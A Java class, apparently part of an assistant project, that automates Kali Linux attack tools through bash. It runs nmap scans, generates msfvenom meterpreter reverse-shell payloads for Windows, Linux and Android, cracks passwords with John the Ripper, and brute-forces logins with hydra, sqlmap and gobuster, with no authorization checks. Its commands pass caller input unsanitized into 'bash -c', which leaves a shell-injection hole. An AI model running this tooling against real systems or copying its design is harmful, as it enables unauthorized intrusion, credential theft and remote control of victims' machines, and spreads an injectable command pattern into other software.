package com.jarvis.security;

import java.io.*;
import java.util.*;
import java.nio.file.*;

/**
 * Kali Linux pentesting tools integration
 * Provides automated execution of security tools for bug bounty and penetration testing
 */
public class PentestingTools {
    
    private static final String RESULTS_DIR = "/tmp/iris-results/";
    private static final String DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt";
    
    public PentestingTools() {
        // Create results directory
        try {
            Files.createDirectories(Paths.get(RESULTS_DIR));
        } catch (IOException e) {
            System.err.println("Could not create results directory: " + e.getMessage());
        }
    }
    
    // ==================== NMAP ====================
    
    /**
     * Quick nmap scan (top 1000 ports)
     */
    public String nmapQuickScan(String target) {
        System.out.println("\nüîç Running quick Nmap scan on: " + target);
        String outputFile = RESULTS_DIR + "nmap_quick_" + sanitizeFilename(target) + ".txt";
        String command = String.format("nmap -T4 -F %s -oN %s", target, outputFile);
        return executeCommand(command, "Nmap Quick Scan", outputFile);
    }
    
    /**
     * Full nmap scan (all ports)
     */
    public String nmapFullScan(String target) {
        System.out.println("\nüîç Running full Nmap scan on: " + target);
        String outputFile = RESULTS_DIR + "nmap_full_" + sanitizeFilename(target) + ".txt";
        String command = String.format("nmap -p- -T4 %s -oN %s", target, outputFile);
        return executeCommand(command, "Nmap Full Scan", outputFile);
    }
    
    /**
     * Nmap OS detection
     */
    public String nmapOSDetection(String target) {
        System.out.println("\nüîç Running Nmap OS detection on: " + target);
        String outputFile = RESULTS_DIR + "nmap_os_" + sanitizeFilename(target) + ".txt";
        String command = String.format("sudo nmap -O %s -oN %s", target, outputFile);
        return executeCommand(command, "Nmap OS Detection", outputFile);
    }
    
    /**
     * Custom nmap scan with options
     */
    public String nmapScan(String target, String options) {
        System.out.println("\nüîç Running custom Nmap scan: " + target);
        String outputFile = RESULTS_DIR + "nmap_custom_" + sanitizeFilename(target) + ".txt";
        String command = String.format("nmap %s %s -oN %s", options, target, outputFile);
        return executeCommand(command, "Nmap Custom Scan", outputFile);
    }
    
    // ==================== METASPLOIT ====================
    
    /**
     * Generate payload with msfvenom
     */
    public String generatePayload(String platform, String type, String lhost, String lport) {
        System.out.println("\nüéØ Generating " + platform + " " + type + " payload");
        
        String payloadName = getPayloadName(platform, type);
        String extension = getPayloadExtension(platform);
        String outputFile = RESULTS_DIR + "payload_" + platform + "_" + lport + extension;
        
        String command = String.format("msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s",
            payloadName, lhost, lport, getPayloadFormat(platform), outputFile);
        
        String result = executeCommand(command, "Msfvenom Payload Generation", outputFile);
        
        if (result.contains("successfully")) {
            return "Payload generated successfully!\nFile: " + outputFile + 
                   "\nPayload: " + payloadName +
                   "\nLHOST: " + lhost +
                   "\nLPORT: " + lport;
        }
        return result;
    }
    
    /**
     * List available payloads for a platform
     */
    public String listPayloads(String platform) {
        System.out.println("\nüìã Listing " + platform + " payloads");
        String command = "msfvenom --list payloads | grep " + platform;
        return executeCommand(command, "List Payloads", null);
    }
    
    /**
     * Encode payload
     */
    public String encodePayload(String payloadFile, String encoder) {
        System.out.println("\nüîê Encoding payload with: " + encoder);
        String outputFile = payloadFile + "_encoded";
        String command = String.format("msfvenom -p - -e %s -i 3 < %s > %s",
            encoder, payloadFile, outputFile);
        return executeCommand(command, "Payload Encoding", outputFile);
    }
    
    // ==================== JOHN THE RIPPER ====================
    
    /**
     * Crack passwords with John the Ripper
     */
    public String crackPassword(String hashFile, String wordlist) {
        if (wordlist == null || wordlist.isEmpty()) {
            wordlist = DEFAULT_WORDLIST;
        }
        
        System.out.println("\nüîì Cracking passwords from: " + hashFile);
        System.out.println("   Using wordlist: " + wordlist);
        
        String command = String.format("john --wordlist=%s %s", wordlist, hashFile);
        String result = executeCommand(command, "John the Ripper", null);
        
        // Show cracked passwords
        String showCommand = "john --show " + hashFile;
        String cracked = executeCommand(showCommand, "Show Cracked", null);
        
        return result + "\n\nCracked Passwords:\n" + cracked;
    }
    
    /**
     * Crack with rules
     */
    public String crackWithRules(String hashFile, String wordlist, String rules) {
        if (wordlist == null || wordlist.isEmpty()) {
            wordlist = DEFAULT_WORDLIST;
        }
        
        System.out.println("\nüîì Cracking with rules: " + rules);
        String command = String.format("john --wordlist=%s --rules=%s %s",
            wordlist, rules, hashFile);
        return executeCommand(command, "John with Rules", null);
    }
    
    // ==================== WIRESHARK / TSHARK ====================
    
    /**
     * Capture packets with tshark
     */
    public String capturePackets(String networkInterface, int duration) {
        System.out.println("\nüì° Capturing packets on " + networkInterface + " for " + duration + " seconds");
        String outputFile = RESULTS_DIR + "capture_" + networkInterface + "_" + System.currentTimeMillis() + ".pcap";
        
        String command = String.format("sudo timeout %d tshark -i %s -w %s",
            duration, networkInterface, outputFile);
        
        String result = executeCommand(command, "Packet Capture", outputFile);
        return "Packet capture complete!\nFile: " + outputFile + "\n" + result;
    }
    
    /**
     * Analyze pcap file
     */
    public String analyzePackets(String pcapFile) {
        System.out.println("\nüìä Analyzing packets: " + pcapFile);
        String command = "tshark -r " + pcapFile + " -q -z io,phs";
        return executeCommand(command, "Packet Analysis", null);
    }
    
    /**
     * Filter packets
     */
    public String filterPackets(String pcapFile, String filter) {
        System.out.println("\nüîç Filtering packets: " + filter);
        String command = String.format("tshark -r %s -Y \"%s\"", pcapFile, filter);
        return executeCommand(command, "Packet Filter", null);
    }
    
    // ==================== OTHER TOOLS ====================
    
    /**
     * Recon-ng reconnaissance
     */
    public String recon(String domain) {
        System.out.println("\nüïµÔ∏è  Running reconnaissance on: " + domain);
        String outputFile = RESULTS_DIR + "recon_" + sanitizeFilename(domain) + ".txt";
        
        // Simple whois and DNS lookup
        String command = String.format("whois %s && dig %s ANY", domain, domain);
        return executeCommand(command, "Reconnaissance", outputFile);
    }
    
    /**
     * Directory enumeration with gobuster
     */
    public String dirBuster(String url, String wordlist) {
        if (wordlist == null || wordlist.isEmpty()) {
            wordlist = "/usr/share/wordlists/dirb/common.txt";
        }
        
        System.out.println("\nüìÇ Enumerating directories on: " + url);
        String outputFile = RESULTS_DIR + "dirbuster_" + sanitizeFilename(url) + ".txt";
        
        String command = String.format("gobuster dir -u %s -w %s -o %s",
            url, wordlist, outputFile);
        return executeCommand(command, "Directory Enumeration", outputFile);
    }
    
    /**
     * SQL injection testing with sqlmap
     */
    public String sqlmap(String url) {
        System.out.println("\nüíâ Testing SQL injection on: " + url);
        String outputFile = RESULTS_DIR + "sqlmap_" + sanitizeFilename(url) + ".txt";
        
        String command = String.format("sqlmap -u \"%s\" --batch --output-dir=%s",
            url, RESULTS_DIR);
        return executeCommand(command, "SQLMap", outputFile);
    }
    
    /**
     * Brute force with hydra
     */
    public String hydra(String target, String service, String wordlist) {
        if (wordlist == null || wordlist.isEmpty()) {
            wordlist = DEFAULT_WORDLIST;
        }
        
        System.out.println("\nüî® Brute forcing " + service + " on: " + target);
        String command = String.format("hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P %s %s %s",
            wordlist, target, service);
        return executeCommand(command, "Hydra Brute Force", null);
    }
    
    // ==================== HELPER METHODS ====================
    
    /**
     * Execute a command and return output
     */
    private String executeCommand(String command, String toolName, String outputFile) {
        try {
            System.out.println("Executing: " + command);
            
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Read output
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                    System.out.println(line);
                }
            }
            
            int exitCode = process.waitFor();
            
            String result = output.toString();
            if (exitCode == 0) {
                String message = toolName + " completed successfully!";
                if (outputFile != null) {
                    message += "\nResults saved to: " + outputFile;
                }
                return message + "\n\n" + result;
            } else {
                return toolName + " failed with exit code " + exitCode + "\n" + result;
            }
            
        } catch (Exception e) {
            return "Error executing " + toolName + ": " + e.getMessage();
        }
    }
    
    /**
     * Get payload name for platform and type
     */
    private String getPayloadName(String platform, String type) {
        platform = platform.toLowerCase();
        type = type.toLowerCase();
        
        if (platform.contains("windows")) {
            if (type.contains("reverse") || type.contains("shell")) {
                return "windows/meterpreter/reverse_tcp";
            } else if (type.contains("bind")) {
                return "windows/meterpreter/bind_tcp";
            }
            return "windows/meterpreter/reverse_tcp";
        } else if (platform.contains("linux")) {
            if (type.contains("reverse")) {
                return "linux/x86/meterpreter/reverse_tcp";
            } else if (type.contains("bind")) {
                return "linux/x86/meterpreter/bind_tcp";
            }
            return "linux/x86/shell_reverse_tcp";
        } else if (platform.contains("android")) {
            return "android/meterpreter/reverse_tcp";
        }
        
        return "generic/shell_reverse_tcp";
    }
    
    /**
     * Get payload format
     */
    private String getPayloadFormat(String platform) {
        if (platform.toLowerCase().contains("windows")) {
            return "exe";
        } else if (platform.toLowerCase().contains("android")) {
            return "apk";
        }
        return "elf";
    }
    
    /**
     * Get payload file extension
     */
    private String getPayloadExtension(String platform) {
        if (platform.toLowerCase().contains("windows")) {
            return ".exe";
        } else if (platform.toLowerCase().contains("android")) {
            return ".apk";
        }
        return ".elf";
    }
    
    /**
     * Sanitize filename
     */
    private String sanitizeFilename(String filename) {
        return filename.replaceAll("[^a-zA-Z0-9.-]", "_");
    }
}
